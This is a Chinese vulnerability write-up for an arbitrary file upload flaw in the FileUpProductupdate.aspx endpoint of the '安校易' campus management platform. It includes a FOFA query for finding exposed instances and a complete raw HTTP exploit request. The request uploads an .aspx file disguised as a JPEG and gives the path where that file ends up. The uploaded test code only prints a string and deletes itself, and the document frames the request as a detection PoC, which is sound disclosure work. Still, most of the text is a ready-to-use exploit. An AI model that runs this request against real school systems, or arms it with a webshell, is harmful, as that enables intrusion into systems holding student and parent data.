**fofa**

```
body="login.aspx?action=GetOrgCardFormat"
```

**一、漏洞简述**

“安校易”以物联网技术为基础，以学生在校“学食住行”管理为中心，将消费管理、门禁管理、各类学生出入管理、家校互通、校门口进出身份识别等系统进行集成，有效减少校园管理盲点，提升校园安全防范与管理水平。同时，“安校易”又以大数据、人脸识别技和移动互联网为核心技术，以“安全·安心·沟通”为核心诉求，在教育局、学校、家长之间构建一个和谐高效和智慧的沟通互动平台，促进教育合力和智慧教育生态体系成型，做到让学校管理安全、让老师管理快捷、让领导科学决策和让家长安心放心。其接口FileUpProductupdate.aspx存在任意文件上传漏洞，攻击者可通过该漏洞获取系统权限。

**二、漏洞检测poc**

```yaml

POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Content-Type: multipart/form-data; boundary=----230982304982309
Connection: close
Content-Length: 251

------230982304982309
Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
Content-Type: image/jpeg

<%@Page Language="C#"%><%Response.Write("HelloWorldTest");System.IO.File.Delete(Request.PhysicalPath);%>
------230982304982309--
```

/Upload/Publish/000000/0_0_0_0/update.aspx